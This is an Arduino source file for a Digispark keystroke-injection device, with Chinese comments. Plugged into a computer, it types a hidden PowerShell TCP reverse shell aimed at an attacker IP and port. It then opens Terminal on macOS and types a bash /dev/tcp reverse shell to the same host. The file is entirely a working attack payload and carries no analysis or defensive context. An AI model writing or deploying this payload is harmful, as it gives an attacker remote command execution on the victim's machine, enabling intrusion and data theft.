#include "DigiKeyboard.h"

// === 配置 ===
#define ATTACKER_IP "192.168.1.100"
#define ATTACKER_PORT "4444"

void setup() {
  DigiKeyboard.delay(2000);
}

void loop() {
  // === 階段 1：開啟命令視窗 ===

  // Windows: Win+R → PowerShell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -WindowStyle Hidden");
  DigiKeyboard.delay(1500);

  // === 階段 2：Windows Payload ===
  DigiKeyboard.print("$client=New-Object System.Net.Sockets.TCPClient('");
  DigiKeyboard.print(ATTACKER_IP);
  DigiKeyboard.print("',");
  DigiKeyboard.print(ATTACKER_PORT);
  DigiKeyboard.println(");$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");

  DigiKeyboard.delay(2000);

  // === 階段 3：macOS Payload（如果 Windows 失敗）===
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Terminal");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // macOS Reverse Shell
  DigiKeyboard.print("bash -i >& /dev/tcp/");
  DigiKeyboard.print(ATTACKER_IP);
  DigiKeyboard.print("/");
  DigiKeyboard.print(ATTACKER_PORT);
  DigiKeyboard.println(" 0>&1 &");

  for(;;) {}
}
